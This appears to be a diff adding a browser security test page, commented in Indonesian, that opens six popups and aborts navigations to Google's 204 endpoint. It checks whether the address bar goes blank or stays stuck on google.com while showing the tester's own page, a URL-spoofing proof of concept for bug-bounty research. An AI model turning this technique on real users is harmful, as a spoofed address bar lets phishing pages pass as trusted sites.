@@ -1,0 +1,45 @@
+<!-- 51 | ⭐⭐⭐ SATU JALUR, DUA ARAH GAGAL — pemersatu seluruh keluarga bar-kosong | [1-CLICK]
+     Saat navigasi dibatalkan, browser menjalankan satu logika: "bar sudah dicat untuk tujuan
+     yang ternyata batal -> mundurkan". Logika itu bisa gagal ke DUA arah yang berlawanan,
+     dan dua-duanya adalah temuan:
+       MUNDUR TERLALU JAUH  -> bar KOSONG, tak ada teks apa pun    (kelas $10k klasik)
+       MUNDUR TIDAK SAMA SEKALI -> bar TERSANGKUT di URL tujuan     (bar menulis google.com,
+                                    layar menampilkan halaman kita)
+     Karena sumbernya satu jalur kode, satu pemicu (204) menguji keduanya sekaligus.
+     Jangan cari dua teknik — sapu satu jalur ke dua arah.
+     Enam jendela dibuka, masing-masing beda pada SATU knob saja: berapa entri riwayat yang
+     ada sebelum abort, dan apakah abort terjadi sebelum atau sesudah entri itu dibuat.
+     Itu variabel penentunya: bar mundur KE MANA tergantung ada-tidaknya tempat untuk mundur.
+     EXPECTED-SECURE  keenam menulis about:blank atau URL yang benar; tak satu pun kosong/tersangkut. -->
+<button onclick="go()">Run 51 (6 jendela)</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
+<script>
+var E = 'https://www.google.com/gen_204';
+var V = [
+  ['nol riwayat: langsung 204', function (w) { }],
+  ['1 entri dulu, lalu 204', function (w) { setTimeout(function () { w.location = E; }, 900); }],
+  ['pushState dulu, lalu 204', function (w) { setTimeout(function () { try { w.history.pushState({}, '', '/a'); } catch (e) { } w.location = E; }, 900); }],
+  ['204 lalu 204 lagi', function (w) { setTimeout(function () { w.location = E; }, 1400); }],
+  ['204 lalu about:blank', function (w) { setTimeout(function () { w.location = 'about:blank'; }, 1400); }],
+  ['204 lalu back()', function (w) { setTimeout(function () { try { w.history.back(); } catch (e) { } }, 1400); }]
+];
+g.textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  V.forEach(function (v, i) {
+    setTimeout(function () {
+      var w = window.open(i === 0 ? E : '', '_blank', 'width=320,height=200,left=' + (20 + (i % 3) * 330) + ',top=' + (40 + Math.floor(i / 3) * 240));
+      if (!w) return;
+      v[1](w);
+      setTimeout(function () {
+        try { w.document.write('<div style="font:12px system-ui;padding:9px"><b>' + (i + 1) + '. ' + v[0] + '</b><br>' + location.origin + '</div>'); w.document.close(); } catch (e) { }
+      }, 2600);
+    }, i * 900);
+  });
+  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n6 jendela dibuka.\n\n' +
+    V.map(function (v, i) { return '  ' + (i + 1) + '. ' + v[0].padEnd(26) + 'bar: ________'; }).join('\n') +
+    '\n\nIsi tiap kolom dgn: KOSONG / about:blank / google.com / origin-ku' +
+    '\n  KOSONG    = mundur terlalu jauh   -> temuan' +
+    '\n  google.com = tidak mundur          -> temuan (yang lebih mahal)' +
+    '\n  about:blank = benar                -> aman';
+}
+</script>
